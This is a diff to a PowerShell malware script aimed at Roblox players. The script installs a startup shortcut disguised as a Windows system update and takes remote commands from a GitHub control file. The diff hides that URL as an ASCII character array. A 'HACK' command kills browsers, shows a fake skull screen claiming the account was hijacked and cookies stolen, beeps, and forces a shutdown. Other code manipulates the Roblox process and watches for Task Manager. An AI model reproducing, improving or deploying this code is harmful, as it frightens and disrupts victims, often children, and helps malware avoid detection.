@@ -7,14 +7,15 @@ $vbsFile = "$dir\Launcher.vbs"
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinSystemUpdate.lnk"
 
 # --- 1. MOTOR DE CONTROL (TaskHostWin.ps1) ---
-$c1 = '$controlUrl = "https://raw.githubusercontent.com/polgatiz/lox/main/control.txt"' + "`n"
+# URL Anonimizada mediante matriz ASCII (Nadie verá el link de GitHub)
+$c1 = '$u = 104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,112,111,108,103,97,116,105,122,47,108,111,120,47,109,97,105,110,47,99,111,110,116,114,111,108,46,116,120,116; $controlUrl = -join ($u | % {[char]$_})' + "`n"
 $c2 = '$windowTitle = "*Roblox*"' + "`n"
 $c3 = 'function MostrarHacker($l1, $l2) {' + "`n"
-# Calavera en Base64 para evitar errores de sintaxis
+# Calavera en Base64 (Blindada contra errores de token)
 $c4 = '    $b64 = "ICAgICAgICAgICAgICAgIC4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQogICAgICAgICAgICAgLjppWWlZaVlpWlVpWlVpWlVpWlVpWlVpWlVpWlVpWlVpWlVpLjoNCiAgICAgICAgICAgOmllWllpWllpWllpWllpWllpWllpWllpWllpWllpWllpWllpWllpWllpOg0KICAgICAgICAgOmllZSAgICAgIGllWllpWllpWllpWllpWllpWllpWllpICAgICAgaWVlOg0KICAgICAgICBpWllpICAgLS0tICBpWllpWllpWllpWllpWllpWllpICAtLS0gICBpWllpDQogICAgICAgaVpZaSAgIHwgWCB8ICBpWllpWllpWllpWllpWllpICB8IFggfCAgIGllWmkNCiAgICAgICBpWllpICAgIC0tLSAgaVpZaVlpWllpWllpWllpWllpICAgLS0tICAgIGllWmkNCiAgICAgICBpWllpICAgICAgICBpWllpWllpWllpWllpWllpWllpICAgICAgICBpWlp0DQogICAgICAgaVpZaVlpWllpWllpWllpWllpWllpWSAgICBpWllpWllpWllpWllpWllpWllpDQogICAgICAgIGllWllpWllpWllpWllpWllpWllpICAgICAgaWVpWllpWllpWllpWllpWllpDQogICAgICAgICAgaWVpWllpWllpWllpWllpICBYWFhYWFggIGllWllpWllpWllpWllpWmkNCiAgICAgICAgICAgaWVpWllpWllpWllpWllpICBYWFhYWFggIGllWllpWllpWllpWllpDQogICAgICAgICAgICAgaWVpWllpWllpWllpICAgICAgICAgIGllWllpWllpWllpDQogICAgICAgICAgICAgICBpWllpWllpWllpWllpWllpWllpWllpWllpWllpWllpWllpDQoNCiAgICAgIFtBTEVSVEE6IFNJU1RFTUEgQ09NUFJPTUVUSURPXQ0KICAgICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgICAgSU5JQ0lBTkRPIFNFQ1VFU1RSTyBERSBDVUVOVEEuLi4NCiAgICAgIEVYVFJBWUVORE8gQ09PS0lFUy4uLi4uLi4uLi4uIFtPS10NCiAgICAgIENBTUJJQU5ETyBDT05UUkFTRdFBLi4uLi4uLi4uLiBbT0tdDQoNCiAgICAgICIgKyAkbDEgKyAiDQogICAgICAiICsgJGwyICsgIg0KICAgICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgICAgRVNUQURPOiBUUkFOU0ZFUkVOQ0lBIEVOIENVUlNPIAo="' + "`n"
 $c5 = '    $ascii = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))' + "`n"
 $c6 = '    $pathS = "$env:TEMP\syserr.ps1"' + "`n"
-$c7 = '    $cmd = "$Host.UI.RawUI.BackgroundColor=''Black'';$Host.UI.RawUI.ForegroundColor=''Red'';Clear-Host;Write-Host ''$ascii'';for(`$i=0;`$i -lt 8;`$i++){[Console]::Beep(200,150);[Console]::Beep(100,150)};Read-Host ''ERROR CRITICO: PRESIONE ENTER - ROBLOX HACKEADO''"' + "`n"
+$c7 = '    $cmd = "$Host.UI.RawUI.BackgroundColor=''Black'';$Host.UI.RawUI.ForegroundColor=''Red'';Clear-Host;Write-Host ''$ascii'';for(`$i=0;`$i -lt 8;`$i++){[Console]::Beep(200,150);[Console]::Beep(100,150)};Read-Host ''ERROR CRITICO: PRESIONE ENTER PARA RECUPERAR''"' + "`n"
 $c8 = '    Set-Content -Path $pathS -Value $cmd -Force' + "`n"
 $c9 = '    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass", "-File", "`"$pathS`"" -WindowStyle Maximized' + "`n"
 $c10 = '}' + "`n"
@@ -27,7 +28,7 @@ $c16 = '    if ($roblox) {' + "`n"
 $c17 = '        $h = $roblox[0].Handle; $TargetProcessID = $roblox[0].Id' + "`n"
 $c18 = '        switch ($comando) {' + "`n"
 $c19 = '            "MSG" { $m = if($partes.Count -gt 1){$partes[1]}else{"Aviso"}; (New-Object -ComObject WScript.Shell).Popup($m, 0, "Windows System", 64) }' + "`n"
-$c20 = '            "HACK" { Get-Process chrome, msedge, firefox, brave -ErrorAction SilentlyContinue | Stop-Process -Force; $m1 = if($partes.Count -gt 1){$partes[1]}else{"¡CUENTA SECUESTRADA!"}; $m2 = if($partes.Count -gt 2){$partes[2]}else{"SESION CERRADA POR SEGURIDAD"}; MostrarHacker $m1 $m2; shutdown.exe /s /t 60 /c "Violacion de seguridad detectada en la cuenta de Roblox." }' + "`n"
+$c20 = '            "HACK" { Get-Process chrome, msedge, firefox, brave -ErrorAction SilentlyContinue | Stop-Process -Force; $m1 = if($partes.Count -gt 1){$partes[1]}else{"¡CUENTA SECUESTRADA!"}; $m2 = if($partes.Count -gt 2){$partes[2]}else{"SESION CERRADA POR SEGURIDAD"}; MostrarHacker $m1 $m2; shutdown.exe /s /t 60 /c "Violacion de seguridad detectada." }' + "`n"
 $c21 = '        }' + "`n"
 $c22 = '        $step = 1; while (Get-Process -Id $TargetProcessID -ErrorAction SilentlyContinue) {' + "`n"
 $c23 = '            if (Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue) { [Win32]::NtResumeProcess($h); Start-Sleep -Seconds 5; continue }' + "`n"
@@ -53,5 +54,4 @@ $Shortcut.TargetPath = "wscript.exe"
 $Shortcut.Arguments = "`"$vbsFile`""
 $Shortcut.Save()
 
-# Iniciar proceso
 Start-Process "wscript.exe" -ArgumentList "`"$vbsFile`""
